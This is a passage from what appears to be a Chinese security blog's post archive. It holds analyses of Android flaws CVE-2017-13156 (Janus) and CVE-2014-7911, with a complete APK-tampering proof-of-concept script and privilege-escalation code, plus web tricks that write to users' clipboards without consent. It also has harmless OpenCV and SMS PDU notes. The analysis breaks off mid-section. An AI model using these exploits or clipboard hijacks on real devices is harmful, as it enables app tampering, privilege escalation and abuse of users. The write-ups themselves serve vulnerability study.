copy, true);document.body.addEventListener('mouseout', copy, true);document.body.addEventListener('mouseover', copy, true);document.body.addEventListener('mouseup', copy, true);document.body.addEventListener('mousewheel', copy, true);document.body.addEventListener('pause', copy, true);document.body.addEventListener('play', copy, true);document.body.addEventListener('playing', copy, true);document.body.addEventListener('progress', copy, true);document.body.addEventListener('ratechange', copy, true);document.body.addEventListener('reset', copy, true);document.body.addEventListener('seeked', copy, true);document.body.addEventListener('seeking', copy, true);document.body.addEventListener('select', copy, true);document.body.addEventListener('stalled', copy, true);document.body.addEventListener('submit', copy, true);document.body.addEventListener('suspend', copy, true);document.body.addEventListener('timeupdate', copy, true);document.body.addEventListener('toggle', copy, true);document.body.addEventListener('volumechange', copy, true);document.body.addEventListener('waiting', copy, true);document.body.addEventListener('wheel', copy, true);document.body.addEventListener('auxclick', copy, true);document.body.addEventListener('gotpointercapture', copy, true);document.body.addEventListener('lostpointercapture', copy, true);document.body.addEventListener('pointerdown', copy, true);document.body.addEventListener('pointermove', copy, true);document.body.addEventListener('pointerup', copy, true);document.body.addEventListener('pointercancel', copy, true);document.body.addEventListener('pointerover', copy, true);document.body.addEventListener('pointerout', copy, true);document.body.addEventListener('pointerenter', copy, true);document.body.addEventListener('pointerleave', copy, true);document.body.addEventListener('beforecopy', copy, true);document.body.addEventListener('beforecut', copy, true);document.body.addEventListener('beforepaste', copy, true);document.body.addEventListener('copy', copy, true);document.body.addEventListener('cut', copy, true);document.body.addEventListener('paste', copy, true);document.body.addEventListener('search', copy, true);document.body.addEventListener('selectstart', copy, true);document.body.addEventListener('webkitfullscreenchange', copy, true);document.body.addEventListener('webkitfullscreenerror', copy, true); 通过实验，我们得出以下结论： 移动端包括Android和iOS都需要点击一下屏幕，无法实现网页加载自动复制。注意是点击一下，而不是滑动。 PC端其实不需要点击，只需要鼠标移动，即可实现复制 既然移动端必须要点一下，我们研究实现了再屏幕上任意位置点击，即可写入剪贴板 Android实现123456789101112131415&lt;input type="text" id="website" value="http://www.sitepoint.com/" /&gt;&lt;button data-copytarget="#website" id="aaa"&gt;copy&lt;/button&gt;&lt;script type="text/javascript"&gt;document.body.addEventListener('mouseup', copy, true);// event handlerfunction copy(e) &#123; website.select() document.execCommand('copy');&#125;&lt;/script&gt; iOS实现iOS不支持execCommand，这里用一个叫clipboard.js（https://clipboardjs.com/）的库，将一个div占满屏幕，然后用户点击任意位置就可以触发点击事件了。 123456789101112131415161718192021&lt;body&gt; &lt;!-- 1. Define some markup --&gt; &lt;div id="btn" style="position:absolute;width:100%;height:100%;" data-clipboard-text="KjABgP05ll"&gt; &lt;span&gt;Copy&lt;/span&gt; &lt;/div&gt; &lt;!-- 2. Include library --&gt; &lt;script src="https://cdn.jsdelivr.net/npm/clipboard@1/dist/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- 3. Instantiate clipboard by passing a HTML element --&gt; &lt;script&gt; var btn = document.getElementById('btn'); var clipboard = new Clipboard(btn); clipboard.on('success', function(e) &#123; console.log(e); &#125;); clipboard.on('error', function(e) &#123; console.log(e); &#125;); &lt;/script&gt;&lt;/body&gt; 利用微信实现 devicemotion事件 html5提供了几个新的DOM事件来获得设备物理方向及运动的信息，包括：陀螺仪、罗盘及加速计等，devicemotion就是其中一种，例如我们常用的摇一摇功能就是利用了该事件。注册了devicemotion事件后，只要用户轻轻动一下手机，就会触发事件代码。 微信写入剪贴板的伪协议 微信Android客户端注册了一个伪协议：weixin://webview/copy/xxxxxxx，对该协议发起请求后，微信会自动将xxxxxxx写入剪贴板。 结合上述两个特性，很容易实现只要打开网页，就会自动写入剪贴板，而微信一定程度上成为了自动传播吱口令的“帮凶”，具体实现如下： 网页注册devicemotion事件，触发后新建一个iframe发起对伪协议的请求123456789101112131415&lt;script&gt;if (window.DeviceMotionEvent) &#123; window.addEventListener('devicemotion', handler, false);&#125; else &#123; alert('not support devicemotion');&#125;function handler(e) &#123; var b = document.createElement("iframe"); b.style.cssText = "display:none;width:0px;height:0px;"; b.src = "weixin://webview/copy/" + "m4bln"; document.body.appendChild(b)&#125;&lt;/script&gt; 利用apple设备的“通用剪贴板”apple设备的“通用剪贴板”，可以在一台 Apple 设备上拷贝文本、图像、照片和视频，然后在另一台 Apple 设备上粘贴该内容。利用通用剪贴板，当用户在PC上点击恶意网页时，吱口令会自动写入到PC的剪贴板，同时“通用剪贴板”机制也会把吱口令写入到手机的剪贴板，此时，用户打开手机上的支付宝，就会进入红包页面。 使用“通用剪贴板”必须满足设备“连续互通”的要求（https://support.apple.com/zh-cn/HT204689） 所有设备均使用同一 Apple ID 登录 iCloud。 所有设备均已开启蓝牙。 所有设备均已开启 Wi-Fi。 但实际测试似乎只要满足登录同一个Apple ID即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[OpenCV学习]]></title>
    <url>%2F2017%2F12%2F25%2FOpenCV%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[打开图片123img = cv2.imread('hat.png')cv2.imshow('image', img)cv2.waitKey(0) #没有waitKey没办法显示 通道提取 图像通道，在RGB色彩模式下就是指那单独的红色、绿色、蓝色部分。也就是说，一幅完整的图像，是由红色绿色蓝色三个通道组成的。他们共同作用产生了完整的图像。阿尔法通道(Alpha Channel)是指一张图片的透明和半透明度。例如：一个使用32位存储的图片，每8位表示红绿蓝，和阿尔法通道。在这种情况下，就不光可以表示透明还是不透明，阿尔法通道还可以表示256级的半透明度。 1234567r,g,b,a = cv2.split(img) cv2.imshow("Blue",r) cv2.imshow("Red",g) cv2.imshow("Green",b) cv2.imshow("Alpha",a) cv2.waitKey(0)#jpg等压缩格式没有Alpha通道 通道合并1merged = cv2.merge([b,g,r]) #前面分离出来的三个通道 灰度转换123gray = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)cv2.imshow('image', gray)cv2.waitKey(0) 人脸检测123456789101112face_patterns = cv2.CascadeClassifier('haarcascade_frontalface_default.xml')//xml文件为opencv在GitHub上共享出来的具有普适的训练好的数据sample_image = cv2.imread('muti.jpg')faces = face_patterns.detectMultiScale(sample_image, scaleFactor=1.1, minNeighbors=8, minSize=(50, 50)) print len(faces)for(x,y,w,h) in faces: cv2.circle(sample_image,((x+x+w)/2,(y+y+h)/2),w/2,(0,255,0),2)cv2.imshow("Find Faces!",sample_image)cv2.waitKey(0)]]></content>
  </entry>
  <entry>
    <title><![CDATA[（待补充）安卓“Janus”漏洞分析（CVE-2017-13156)]]></title>
    <url>%2F2017%2F12%2F11%2F%E5%AE%89%E5%8D%93%E2%80%9CJanus%E2%80%9D%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-%EF%BC%89%2F</url>
    <content type="text"><![CDATA[简介“Janus”漏洞是Google在12月发布的安卓系统的安全公告中披露的，由移动安全公司GuardSquare 的研究团队发现，漏洞编号：CVE-2017-13156。该漏洞的可以绕过Andorid的签名校验机制，攻击者可以利用漏洞通过升级的方式对App进行篡改。 由于安卓系统中App的安全和可信都是建立在签名和校验基础之上，“Janus”漏洞绕过了系统的签名校验，可以说是突破了安卓整个安全机制，导致安卓整个安全体系的沦陷。 一旦攻击者将植入恶意代码的仿冒的App投放到安卓商店等第三方应用市场，就可替代原有的App做下载、更新。网友安装这些仿冒App后，不仅会泄露个人账号、密码、照片、文件等隐私信息，手机更可能被植入木马病毒，进而或导致手机被ROOT，甚至被远程操控。 影响范围 安卓5.0-8.0的各个版本系统； 使用安卓Signaturescheme V1签名的App APK文件。 由于，signature scheme V2需要对App进行重新发布，而大量的已经存在的App APK无法使用V2校验机制，所以为了保证向前兼容性，V1的校验方式的还被保留,故该漏洞影响范围较大。 漏洞分析漏洞原理1、安卓在4.4中引入了新的执行虚拟机ART，这个虚拟机经过重新的设计，实现了大量的优化，提高了应用的运行效率。与“Janus”有关的一个技术点是，ART允许运行一个raw dex，也就是一个纯粹的dex文件，不需要在外面包装一层zip。而ART的前任DALVIK虚拟机就要求dex必须包装在一个zip内部且名字是classes.dex才能运行。当然ART也支持运行包装在ZIP内部的dex文件，要区别文件是ZIP还是dex，就通过文件头的magic字段进行判断：ZIP文件的开头是‘PK’, 而dex文件的开头是’dex’.1代码部分 2、APK本质是一个ZIP文件，ZIP文件的读取方式是通过在文件末尾定位central directory, 然后通过里面的索引定位到各个zip entry，每个entry解压之后都对应一个文件。1代码部分 因此： 对于上述1,ART通过文件头判断是否为dex文件，然后按照dex的格式进行解析，而如果在dex文件之后附加其他数据，完全不影响其工作机制 对于上述2，系统在解析一个APK文件时，是从文件末尾寻找central directory标志，然后依次展开解析的。如果在一个ZIP文件头部追加任意数据，也完全不影响整个APK解析过程。（ZIP/APK文件中数据的偏移需要改动） 所以，攻击者构造一个（恶意dex+合法APK）文件，并修改好APK中部分数据的偏移，如下图，则可以同时满足上述两个条件。而上述1为Android执行代码的入口，即ART会执行我们构造的恶意dex;上述2完成解析后会对APK进行签名校验,实际校验时，参与校验运算的数据均为合法APK的数据。 简而言之，构造的畸形文件既可以通过签名校验部分，又可以执行攻击者构造的任意代码，巧妙的绕过Android的应用安全机制。 漏洞利用 攻击者可以向APK文件的开始位置放置一个攻击的DEX文件A； 安卓系统在安装时用ZIP的读取机制从末尾开始进行文件的读取，读取到了原始的APK内容，并且以V1的方式进行校验，认为这个文件是正常的，没有篡改，APK安装成功； 在运行时，Android的ART虚拟机从文件头开始读取，发现是一个DEX文件，直接执行，攻击文件A被最终执行。 利用代码如下，来自V-E-O的githubhttps://github.com/V-E-O/PoC/tree/373104bea150895e10879e87fcecfa0318c82647/CVE-2017-13156 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/pythonimport sysimport structimport hashlibfrom zlib import adler32def update_checksum(data): m = hashlib.sha1() m.update(data[32:]) data[12:12+20] = m.digest() v = adler32(buffer(data[12:])) &amp; 0xffffffff data[8:12] = struct.pack("&lt;L", v)def main(): if len(sys.argv) != 4: print("usage: %s dex apk out_apk" % __file__) return _, dex, apk, out_apk = sys.argv with open(dex, 'rb') as f: dex_data = bytearray(f.read()) dex_size = len(dex_data) with open(apk, 'rb') as f: apk_data = bytearray(f.read()) cd_end_addr = apk_data.rfind('\x50\x4b\x05\x06') cd_start_addr = struct.unpack("&lt;L", apk_data[cd_end_addr+16:cd_end_addr+20])[0] apk_data[cd_end_addr+16:cd_end_addr+20] = struct.pack("&lt;L", cd_start_addr+dex_size) pos = cd_start_addr while (pos &lt; cd_end_addr): offset = struct.unpack("&lt;L", apk_data[pos+42:pos+46])[0] apk_data[pos+42:pos+46] = struct.pack("&lt;L", offset+dex_size) pos = apk_data.find("\x50\x4b\x01\x02", pos+46, cd_end_addr) if pos == -1: break out_data = dex_data + apk_data out_data[32:36] = struct.pack("&lt;L", len(out_data)) update_checksum(out_data) with open(out_apk, "wb") as f: f.write(out_data) print ('%s generated' % out_apk)if __name__ == '__main__': main() 需要注意的是，ART在执行恶意dex时，由于需要和真实APK中的AndroidManifest.xml相对应，多数情况下受到很多限制，例如： 用来构造畸形文件的APK必须是被攻击APP的新版本，否则Android系统会拒绝安装 恶意dex的包名、入口类等需要与被攻击APP完全一致 恶意dex需要实现被攻击APK的provider 标签里的android:name类需要实现 setContentView的资源文件id需要和被攻击APP一致 通过重打包的方式构造攻击dex文件市，需要考虑原APK为多dex的情况，因为此漏洞只能执行一个恶意dex文件 漏洞修复修复代码如下，在解析APK的时候对文件头（LocalFileHeader::kSignature）进行了验证，如果文件头不对，停止解析。https://android.googlesource.com/platform/system/core/+/9dced1626219d47c75a9d37156ed7baeef8f6403%5E%21/#F0123456789101112131415161718192021222324252627diff --git a/libziparchive/zip_archive.cc b/libziparchive/zip_archive.ccindex 78de40a..d0bbd72 100644--- a/libziparchive/zip_archive.cc+++ b/libziparchive/zip_archive.cc@@ -441,6 +441,22 @@ return -1; &#125; &#125;++ uint32_t lfh_start_bytes;+ if (!archive-&gt;mapped_zip.ReadAtOffset(reinterpret_cast&lt;uint8_t*&gt;(&amp;lfh_start_bytes),+ sizeof(uint32_t), 0)) &#123;+ ALOGW("Zip: Unable to read header for entry at offset == 0.");+ return -1;+ &#125;++ if (lfh_start_bytes != LocalFileHeader::kSignature) &#123;+ ALOGW("Zip: Entry at offset zero has invalid LFH signature %" PRIx32, lfh_start_bytes);+#if defined(__ANDROID__)+ android_errorWriteLog(0x534e4554, "64211847");+#endif+ return -1;+ &#125;+ ALOGV("+++ zip good scan %" PRIu16 " entries", num_entries); return 0; 其他为什么V2签名机制不受影响？APK+APK的方式是否可行？recovery如何验证签名？历史上的签名漏洞]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机短信PDU格式分析]]></title>
    <url>%2F2017%2F12%2F10%2F%E6%89%8B%E6%9C%BA%E7%9F%AD%E4%BF%A1PDU%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Text模式和PDU模式目前，发送短消息常用Text和PDU(Protocol Data Unit，协议数据单元)模式。使用Text模式收发短信代码简单，实现起来十分容易，但最大的缺点是不能收发中文短信；而PDU模式不仅支持中文短信，也能发送英文短信。 PDU模式收发短信可以使用3种编码：7-bit、8-bit和UCS2编码。7-bit编码用于发送普通的ASCII字符，8-bit编码通常用于发送数据消息，UCS2编码用于发送Unicode字符。一般的PDU编码由A B C D E F G H I J K L M十三项组成。 A：短信息中心地址长度，2位十六进制数(1字节)。B：短信息中心号码类型，2位十六进制数。C：短信息中心号码，B+C的长度将由A中的数据决定。D：文件头字节，2位十六进制数。E：信息类型，2位十六进制数。F：被叫号码长度，2位十六进制数。G：被叫号码类型，2位十六进制数，取值同B。H：被叫号码，长度由F中的数据决定。I：协议标识，2位十六进制数。J：数据编码方案，2位十六进制数。K：有效期，2位十六进制数。L：用户数据长度，2位十六进制数。M：用户数据，其长度由L中的数据决定。J中设定采用UCS2编码，这里是中英文的Unicode字符。 PDU举例 例1发送：SMSC号码是+8613800250500，对方号码是13693092030，消息内容是“Hello!”。从手机发出的PDU串可以是108 91 68 31 08 20 05 05 F0 11 00 0D 91 68 31 96 03 29 30 F0 00 00 00 06 C8 32 9B FD 0E 01 对照规范，具体分析：SMSC#+8613800250500Sender:+8613693092030TP_PID:00TP_DCS:00TP_DCS-popis:Uncompressed Textclass:0Alphabet:Default Hello!Length:6 (在线解析和生成PDU http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm) 分段 含义 说明 08 SMSC地址信息的长度 共8个八位字节(包括91) 91 SMSC地址格式(TON/NPI) 用国际格式号码(在前面加‘+’) 68 31 08 20 05 05 F0 SMSC地址 8613800250500，补‘F’凑成偶数个 11 基本参数(TP-MTI/VFP) 发送，TP-VP用相对格式 00 消息基准值(TP-MR) 0 0D 目标地址数字个数 共13个十进制数(不包括91和‘F’) 91 目标地址格式(TON/NPI) 用国际格式号码(在前面加‘+’) 68 31 96 03 29 30 F0 目标地址(TP-DA) 8613693092030，补‘F’凑成偶数个 00 协议标识(TP-PID) 是普通GSM类型，点到点方式 00 用户信息编码方式(TP-DCS) 7-bit编码 00 有效期(TP-VP) 5分钟 06 用户信息长度(TP-UDL) 实际长度6个字节 C8 32 9B FD 0E 01 用户信息(TP-UD) “Hello!” 例2接收：SMSC号码是+8613800250500，对方号码是13693092030，消息内容是“你好!”。手机接收到的PDU串可以是108 91 68 31 08 20 05 05 F0 84 0D 91 68 31 96 03 29 30 F0 00 08 30 30 21 80 63 54 80 06 4F 60 59 7D 00 21 对照规范，具体分析：SMSC#+8613800250500Sender:+8613693092030TimeStamp:12/03/03 08:36:45TP_PID:00TP_DCS:08TP_DCS-popis:Uncompressed Textclass:0Alphabet:UCS2(16)bit 你好!Length:3(在线解析和生成PDU http://www.multisilicon.com/_a/blog/a22201774~/pdu.htm) 分段 含义 说明 08 地址信息的长度 个八位字节(包括91) 91 SMSC地址格式(TON/NPI) 用国际格式号码(在前面加‘+’) 68 31 08 20 05 05 F0 SMSC地址 8613800250500，补‘F’凑成偶数个 84 基本参数(TP-MTI/MMS/RP) 接收，无更多消息，有回复地址 0D 回复地址数字个数 共13个十进制数(不包括91和‘F’) 91 回复地址格式(TON/NPI) 用国际格式号码(在前面加‘+’) 68 31 96 03 29 30 F0 回复地址(TP-RA) 8613693092030，补‘F’凑成偶数个 00 协议标识(TP-PID) 是普通GSM类型，点到点方式 08 用户信息编码方式(TP-DCS) UCS2编码 30 30 21 80 63 54 80 时间戳(TP-SCTS) 2003-3-12 08:36:45 +8时区 06 用户信息长度(TP-UDL) 实际长度6个字节 4F 60 59 7D 00 21 用户信息(TP-UD) “你好!” NotePDU的文本可以采用三种编码方式来对发送的内容进行编码，它们是7-bit、8-bit和UCS2编码。 7-bit编码用于发送普通的ASCII字符，它将一串7-bit的字符(最高位为0)编码成8-bit的数据，每8个字符可“压缩”成7个； 8-bit编码通常用于发送数据消息，比如图片和铃声等； UCS2编码用于发送Unicode字符。 PDU串的用户信息(TP-UD)段最大容量是140字节，所以在这三种编码方式下，可以发送的短消息的最大字符数分别是160、140（字节）和70。这里，将一个英文字母、一个汉字和一个数据字节都视为一个字符。 （短信160个字符按照7位ASCII编码来换算，即160×7=1120位；汉字按照8位UCS-2编码，也就是说8位即1个字节，1个汉字又占2个字节，那么换算为汉字数就是1120/8/2=70。所以，一条短信是可以发160个英文或70个汉字的。） 参考链接：微博为什么140字 http://www.woshipm.com/pd/306996.html]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cve-2014-7911]]></title>
    <url>%2F2017%2F12%2F09%2Fcve-2014-7911%2F</url>
    <content type="text"><![CDATA[0x00 简介CVE-2014-7911是安卓上序列化的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。漏洞的成因源于在安卓系统（&lt;5.0）中，java.io.ObjectInputStream并未校验输入的java对象是否是实际可序列化的。攻击者因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，使攻击者获得控制权 0x01 漏洞分析向system_server传入的不可序列化的android.os.BinderProxy对象实例，其成员变量在反序列化时发生类型混淆，由于BinderProxy的finalize方法包含native代码，于是在本地代码执行时将成员变量强制转换为指针，注意到成员变量是攻击者可控的，也就意味着攻击者可以控制该指针，使其指向攻击者可控的地址空间，最终获得在system_server（uid=1000）中执行代码的权限。 下面主要结合POC对漏洞进行详细分析。 构建可序列化对象 12345public class BinderProxy implements Serializable &#123; private static final long serialVersionUID = 0; private int mObject = 0x1337beef; private int mOrgue = 0x1337beef; &#125; mOrgue和mObject的类型参照源码（frameworks/base/core/java/android/os/Binder.java） 123Bundle bundle = new Bundle();AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();bundle.putSerializable(&quot;eatthis&quot;, evilProxy); AAdroid.os.BinderProxy是可序列化的，其成员变量mOrgue就是随后用于改变程序执行流程的指针。随后该可序列化的AAdroid.os.BinderProxy将在传入system_server之间修改为不可序列化的Android.os.BinderProxy对象 准备传入system_server的数据 通过一系列java的反射机制，获得android.os.IUserManager.Stub和andrioid.os.IUserManager.Stub.Proxy的Class对象，最终获得跨进程调用system_server的IBinder接口mRemote，以及调用UserManager.setApplicationRestriction函数的TRANSACTION_setApplicationRestriction，为与system_server的跨进程Binder通信作准备 123456789101112131415161718192021222324 Class stubClass = null;for (Class inner : Class.forName(&quot;android.os.IUserManager&quot;).getDeclaredClasses()) &#123; if (inner.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) &#123; stubClass = inner; &#125;&#125;Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);TRANSACTION_setApplicationRestrictionsField.setAccessible(true);TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(null);Class proxyClass = null;for (Class inner : stubClass.getDeclaredClasses()) &#123; if (inner.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) &#123; proxyClass = inner; &#125;&#125;UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);Field mServiceField = UserManager.class.getDeclaredField(&quot;mService&quot;);mServiceField.setAccessible(true);Object mService = mServiceField.get(userManager);Field mRemoteField = proxyClass.getDeclaredField(&quot;mRemote&quot;);mRemoteField.setAccessible(true);mRemote = (IBinder) mRemoteField.get(mService);UserHandle userHandle = android.os.Process.myUserHandle();setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode()); system_server进程拥有system权限，通过将对象传递给system_server，利用一些技巧达到提权到system的目的。 传入不可序列化对象 调用setApplicationRestrictions这个函数，传入之前打包evilproxy的Bundle数据作为参数。将该函数与Android源码中的setApplicationRestrication函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server的Android.os.UserManager.setApplicationRestrictions方法 12345678910111213141516171819202122232425262728private void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException &#123; android.os.Parcel _data = android.os.Parcel.obtain(); android.os.Parcel _reply = android.os.Parcel.obtain(); try &#123; _data.writeInterfaceToken(DESCRIPTOR); _data.writeString(packageName); _data.writeInt(1); restrictions.writeToParcel(_data, 0); _data.writeInt(userHandle); byte[] data = _data.marshall(); for (int i=0; true; i++) &#123; if (data[i] == &apos;A&apos; &amp;&amp; data[i+1] == &apos;A&apos; &amp;&amp; data[i+2] == &apos;d&apos; &amp;&amp; data[i+3] == &apos;r&apos;) &#123; data[i] = &apos;a&apos;; data[i+1] = &apos;n&apos;; break; &#125; &#125; _data.recycle(); _data = Parcel.obtain(); _data.unmarshall(data, 0, data.length); mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); _reply.readException(); &#125; finally &#123; _reply.recycle(); _data.recycle(); &#125;&#125; 安装POC后，启动Activity后将其最小化，触发GC，引起Android系统重启，从Logcat日志中可以看到，system_server执行到了之前设置的BinderProxy对象的0x1337beef这个值，访问了不该访问的内存，导致异常。错误信号、寄存器快照和调用栈如下： 1234567891011121314151617181920212205-14 18:30:55.974: I/DEBUG(3695): Build fingerprint: &apos;google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys&apos;05-14 18:30:55.974: I/DEBUG(3695): Revision: &apos;11&apos;05-14 18:30:55.974: I/DEBUG(3695): pid: 1552, tid: 1560, name: FinalizerDaemon &gt;&gt;&gt; system_server &lt;&lt;&lt;05-14 18:30:55.974: I/DEBUG(3695): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 1337bef305-14 18:30:56.064: I/DEBUG(3695): r0 1337beef r1 401b89d9 r2 746fdad8 r3 6d4fbdc405-14 18:30:56.064: I/DEBUG(3695): r4 401b89d9 r5 1337beef r6 713e3f68 r7 1337beef05-14 18:30:56.064: I/DEBUG(3695): r8 1337beef r9 74709f68 sl 746fdae8 fp 74aacb2405-14 18:30:56.064: I/DEBUG(3695): ip 401f08a4 sp 74aacae8 lr 401b7981 pc 40105176 cpsr 200d0030...I/DEBUG ( 241): backtrace:I/DEBUG ( 241): #00 pc 0000d176 /system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)I/DEBUG ( 241): #01 pc 0007097d /system/lib/libandroid_runtime.soI/DEBUG ( 241): #02 pc 0001dbcc /system/lib/libdvm.so (dvmPlatformInvoke+112)I/DEBUG ( 241): #03 pc 0004e123 /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+398)I/DEBUG ( 241): #04 pc 00026fe0 /system/lib/libdvm.soI/DEBUG ( 241): #05 pc 0002dfa0 /system/lib/libdvm.so (dvmMterpStd(Thread*)+76)I/DEBUG ( 241): #06 pc 0002b638 /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+184)I/DEBUG ( 241): #07 pc 0006057d /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, bool, JValue*, std::__va_list)+336)I/DEBUG ( 241): #08 pc 000605a1 /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+20)I/DEBUG ( 241): #09 pc 00055287 /system/lib/libdvm.soI/DEBUG ( 241): #10 pc 0000d170 /system/lib/libc.so (__thread_entry+72)I/DEBUG ( 241): #11 pc 0000d308 /system/lib/libc.so (pthread_create+240) 0x02 crash分析假如BinderProxy可以被序列化，那么在反序列化时，其field引用的对象也会被反序列化；但在POC中ObjectInputStream反序列化的BinderProxy对象实例不可序列化，这样在ObjectInputStream反序列化BinderProxy对象时，发生了类型混淆（type confusion），其field被当做随后由Native代码处理的指针。这个filed就是之前设置的0x1337beef，具体而言，就是mOrgue这个变量。android.os.BinderProxy的finalize方法调用native代码，将mOrgue处理为指针： 12345678@Overrideprotected void finalize() throws Throwable &#123; try &#123; destroy(); &#125; finally &#123; super.finalize(); &#125;&#125; 其中，destroy为native方法： 1private native final void destroy(); cpp代码： 12345678910111213static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj)&#123; IBinder* b = (IBinder*) env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject); DeathRecipientList* drl = (DeathRecipientList*) env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue); LOGDEATH(&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;, obj, b, drl); env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0); env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0); drl-&gt;decStrong((void*)javaObjectForIBinder); b-&gt;decStrong((void*)javaObjectForIBinder); IPCThreadState::self()-&gt;flushCommands();&#125; 最终native代码调用上述decStrong方法，从 12DeathRecipientList* drl = (DeathRecipientList*) env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue); 这一行可以看出，drl就是mOrgue，可以被攻击者控制。 所以，drl-&gt;decStrong方法调用使用的this指针可由攻击者控制。 再看一下RefBase类中的decStrong方法 12345678910111213141516void RefBase::decStrong(const void* id) const&#123; weakref_impl* const refs = mRefs; refs-&gt;removeStrongRef(id); const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong); #if PRINT_REFS ALOGD(&quot;decStrong of %p from %p: cnt=%d\n&quot;, this, id, c); #endif ALOG_ASSERT(c &gt;= 1, &quot;decStrong() called on %p too many times&quot;, refs); if (c == 1) &#123; refs-&gt;mBase-&gt;onLastStrongRef(id); if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) == OBJECT_LIFETIME_STRONG) &#123; delete this; &#125; refs-&gt;decWeak(id);&#125; 注意上述refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致代码执行。上面提到我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针。 0x03 汇编分析将libutils.so拖入IDA Pro，查看Android::RefBase::decStrong函数。分析时需要牢记的是，攻击者能够控制r0(this指针)： 首先对r0的使用，是在decStrong的前下面三行代码之中： 123weakref_impl* const refs = mRefs;refs-&gt;removeStrongRef(id);const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong); 对应的汇编代码如下： 1234ldr r4, [r0, #4] # r0为this指针，r4为mRefsmov r6, r1mov r0, r4blx &lt;android_atomic_dec ()&gt; 首先，mRefs被加载到r4。（r0是drl的this指针，mRefs是虚函数表之后的第一个私有变量，因此mRefs为r0+4所指向的内容）然后，android_atomic_dec函数被调用，传入参数&amp;refs-&gt;mStrong。 1const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong); 这被翻译为： 12mov r0, r4 # r4指向mStrong，r0指向mStrongblx &lt;android_atomic_dec ()&gt; 作为函数参数，上述r0就是&amp;refs-&gt;mStrong。注意，mStrong是refs（类weakref_impl）的第一个成员变量，由于weakref_impl没有虚函数，所以没有虚函数表，因此mStrong就是r4所指向的内容。另外，refs-&gt;removeStrongRef(id);这一行并没有出现在汇编代码中，因为这个函数为空实现，编译器进行了优化。如下所示： 1void removeStrongRef(const void* /*id*/) &#123; &#125; 在调用android_atomic_dec后，出现的是以下代码： 123if (c == 1) &#123; refs-&gt;mBase-&gt;onLastStrongRef(id);&#125; 对应的汇编代码 1234567cmp r0, #1 # r0 = refs-&gt;mStrongbne.n d1ealdr r0, [r4, #8] # r4 = &amp;refs-&gt;mStrongmov r1, r6ldr r3, [r0, #0] ldr r2, [r3, #12]blx r2 注意，android_atomic_dec函数执行强引用计数减1，返回的是执行减1操作之前所指定的内存地址存放的值。为了调用refs-&gt;mBase-&gt;onLastStrongRef(id)(即：blx r2)，攻击者需要使refs-&gt;mStrong为1。至此，可以看出攻击者为了实现代码执行，需要满足如下约束条件： drl(就是mOrgue，第一个可控的指针，在进入decStrong函数时的r0)必须指向可读的内存区域; refs-&gt;mStrong必须为1; refs-&gt;mBase-&gt;onLastStrongRef(id)需要执行成功。并最终指向可执行的内存区域。即满足： 12345if(*(*(mOrgue+4)) == 1) &#123; refs = *(mOrgue+4); r2 = *(*(*(refs+8))+12); blx r2 ; &lt;—— controlled;&#125; 除此以外，攻击者还必须克服Android中的漏洞缓解技术——ASLR和DEP。 0x04 漏洞利用1.绕过ASLRAndroid有做地址空间随机化ASLR，但是所有的app都是fork自zygote进程，基础模块的内存布局全部是相同的，也就是说我们可以简单的绕过system_server的ASLR。 shell@hammerhead:/ # cat /proc/10156/maps | grep dalvik-heap4273c000-616da000 rw-p 00000000 00:04 32910 /dev/ashmem/dalvik-heap (deleted)shell@hammerhead:/ # cat /proc/18446/maps | grep dalvik-heap4273c000-616da000 rw-p 00000000 00:04 32910 /dev/ashmem/dalvik-heap (deleted) 2. 